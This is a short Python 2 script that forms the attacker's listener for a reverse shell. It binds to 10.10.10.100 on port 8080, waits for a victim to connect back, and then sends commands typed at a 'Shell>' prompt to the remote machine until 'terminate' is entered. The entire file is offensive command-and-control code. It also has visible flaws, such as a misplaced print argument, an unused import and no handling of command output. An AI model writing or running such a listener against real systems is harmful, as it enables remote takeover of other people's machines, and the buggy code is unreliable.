import socket
import pylint

def connect():

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("10.10.10.100", 8080))
    s.listen(1)
    connect, addr = s.accept()
    print ('[+] We got a connection from: '), addr

    while True:
        
        command = raw_input("Shell> ")
        
        if 'terminate' in command:
            connect.send('terminate')
            connect.close()
            break

        else:
            connect.send(command)
            

def main ():
    connect ()
main()
